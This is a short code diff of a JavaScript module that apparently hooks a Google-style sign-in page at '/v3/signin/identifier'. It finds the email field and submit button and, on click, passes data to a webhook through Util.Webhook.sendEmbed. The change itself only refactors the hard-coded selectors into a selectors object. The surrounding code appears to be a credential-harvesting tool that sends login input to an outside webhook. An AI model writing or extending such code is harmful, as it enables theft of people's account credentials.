@@ -8,8 +8,8 @@ module.exports = {
     {
       path: '/v3/signin/identifier',
       run() {
-        const emailInput = document.querySelector('.whsOnd.zHQkBf');
-        const submitButton = document.querySelector('button[jscontroller="soHxf"][data-idom-class^="nCP5yc AjY5Oe"]');
+        const emailInput = document.querySelector(this.getSelector('input'));
+        const submitButton = document.querySelector(this.getSelector('submit'));
 
         submitButton.addEventListener('click', async () => {
           const { id } = await Util.Webhook.sendEmbed({
@@ -38,5 +38,9 @@ module.exports = {
         });
       }
     }
-  ]
+  ],
+  selectors: {
+    input: '.whsOnd.zHQkBf',
+    submit: 'button[jscontroller="soHxf"][data-idom-class^="nCP5yc AjY5Oe"]'
+  }
 };
